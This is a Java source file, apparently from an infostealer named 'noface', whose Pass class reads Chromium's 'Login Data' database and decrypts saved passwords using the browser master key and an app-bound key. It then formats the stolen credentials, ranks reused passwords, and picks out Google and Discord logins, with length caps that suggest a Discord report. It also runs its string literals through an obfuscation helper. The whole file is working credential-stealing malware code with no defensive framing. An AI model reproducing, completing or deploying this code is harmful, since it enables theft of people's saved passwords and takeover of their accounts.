package noface.browsers;

import noface.config.S;

import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public final class Pass {

    public record Entry(String url, String user, String pass) {}

    private static String sql() {
        return S.e("SELECT origin_url, username_value, password_value FROM logins ")
                + S.e("WHERE password_value IS NOT NULL AND length(password_value) > 0");
    }

    public static List<Entry> pull(Profile profile) {
        List<Entry> out = new ArrayList<>();
        if (profile.masterKey() == null && profile.abeKey() == null) return out;
        Db.query(profile.dir().resolve(S.e("Login Data")), sql(), rs -> add(rs, profile, out));
        return out;
    }

    private static void add(ResultSet rs, Profile profile, List<Entry> out) {
        try {
            String url = rs.getString(1);
            String user = rs.getString(2);
            byte[] enc = rs.getBytes(3);
            if (enc == null || enc.length == 0) return;
            String pass = Aes.decrypt(enc, profile.masterKey(), profile.abeKey());
            if (pass == null || pass.isEmpty()) return;
            out.add(new Entry(n(url), n(user), pass));
        } catch (Exception ignored) {}
    }

    public static String fmt(List<Entry> entries) {
        StringBuilder sb = new StringBuilder();
        for (Entry e : entries) {
            sb.append(S.e("URL: ")).append(e.url()).append('\n');
            sb.append(S.e("Username: ")).append(e.user()).append('\n');
            sb.append(S.e("Password: ")).append(e.pass()).append("\n\n");
        }
        return sb.toString();
    }

    public static String most(List<Entry> entries) {
        if (entries == null || entries.isEmpty()) return "";
        Map<String, Integer> freq = new HashMap<>();
        for (Entry e : entries) {
            String p = e.pass();
            if (p == null || p.isEmpty()) continue;
            freq.merge(p, 1, Integer::sum);
        }
        List<Map.Entry<String, Integer>> ranked = new ArrayList<>(freq.entrySet());
        ranked.sort((a, b) -> {
            int c = Integer.compare(b.getValue(), a.getValue());
            if (c != 0) return c;
            return a.getKey().compareTo(b.getKey());
        });
        StringBuilder sb = new StringBuilder();
        int n = 0;
        for (Map.Entry<String, Integer> e : ranked) {
            if (e.getValue() < 2) continue;
            if (n >= 4) break;
            String line = tick(e.getKey()) + " (" + e.getValue() + "x)";
            if (sb.length() + line.length() + 1 > 3500) break;
            if (sb.length() > 0) sb.append('\n');
            sb.append(line);
            n++;
        }
        return sb.toString();
    }

    public static String google(List<Entry> entries) {
        if (entries == null || entries.isEmpty()) return "";
        Set<String> seen = new HashSet<>();
        StringBuilder sb = new StringBuilder();
        int n = 0;
        for (Entry e : entries) {
            if (!isGoogle(e)) continue;
            String user = e.user() == null ? "" : e.user().trim();
            String pass = e.pass() == null ? "" : e.pass();
            if (user.isEmpty() || pass.isEmpty() || !user.contains("@")) continue;
            String key = user.toLowerCase(Locale.ROOT) + '\0' + pass;
            if (!seen.add(key)) continue;
            String line = tick(user) + ":" + tick(pass);
            if (sb.length() + line.length() + 1 > 3500) break;
            if (sb.length() > 0) sb.append('\n');
            sb.append(line);
            n++;
            if (n >= 40) break;
        }
        return sb.toString();
    }

    public static String discord(List<Entry> entries, String email, String user) {
        if (entries == null || entries.isEmpty()) return "`" + S.e("No Passwords") + "`";
        String em = email == null ? "" : email.trim().toLowerCase(Locale.ROOT);
        String un = user == null ? "" : user.trim().toLowerCase(Locale.ROOT);
        Map<String, Integer> freq = new HashMap<>();
        for (Entry e : entries) {
            String p = e.pass();
            if (p == null || p.isEmpty()) continue;
            boolean hit = disc(host(e.url()));
            String u = e.user() == null ? "" : e.user().trim().toLowerCase(Locale.ROOT);
            if (!hit && !u.isEmpty() && (u.equals(em) || u.equals(un))) hit = true;
            if (!hit) continue;
            freq.merge(p, 1, Integer::sum);
        }
        if (freq.isEmpty()) return "`" + S.e("No Passwords") + "`";
        List<Map.Entry<String, Integer>> ranked = new ArrayList<>(freq.entrySet());
        ranked.sort((a, b) -> {
            int c = Integer.compare(b.getValue(), a.getValue());
            if (c != 0) return c;
            return a.getKey().compareTo(b.getKey());
        });
        StringBuilder sb = new StringBuilder();
        int n = 0;
        for (Map.Entry<String, Integer> e : ranked) {
            if (n >= 8) break;
            String line = "`" + tick(e.getKey()) + "`";
            if (e.getValue() >= 2) line += " **(" + e.getValue() + "x)**";
            if (sb.length() + line.length() + 1 > 1200) break;
            if (sb.length() > 0) sb.append('\n');
            sb.append(line);
            n++;
        }
        return sb.length() == 0 ? "`" + S.e("No Passwords") + "`" : sb.toString();
    }

    private static boolean disc(String h) {
        return h.equals(S.e("discord.com"))
                || h.equals(S.e("discordapp.com"))
                || h.endsWith(S.e(".discord.com"))
                || h.endsWith(S.e(".discordapp.com"));
    }

    private static boolean isGoogle(Entry e) {
        String h = host(e.url());
        return h.equals(S.e("mail.google.com"))
                || h.equals(S.e("accounts.google.com"))
                || h.equals(S.e("myaccount.google.com"))
                || h.equals(S.e("gmail.com"))
                || h.equals(S.e("googlemail.com"));
    }

    private static String host(String url) {
        if (url == null || url.isEmpty()) return "";
        String u = url.trim().toLowerCase(Locale.ROOT);
        int scheme = u.indexOf(S.e("://"));
        if (scheme >= 0) u = u.substring(scheme + 3);
        int cut = u.indexOf('/');
        if (cut >= 0) u = u.substring(0, cut);
        int at = u.lastIndexOf('@');
        if (at >= 0) u = u.substring(at + 1);
        int port = u.indexOf(':');
        if (port >= 0) u = u.substring(0, port);
        if (u.startsWith(S.e("www."))) u = u.substring(4);
        return u;
    }

    private static String tick(String s) {
        return s.replace('`', '\'');
    }

    private static String n(String s) { return s == null ? "" : s; }

    private Pass() {}
}
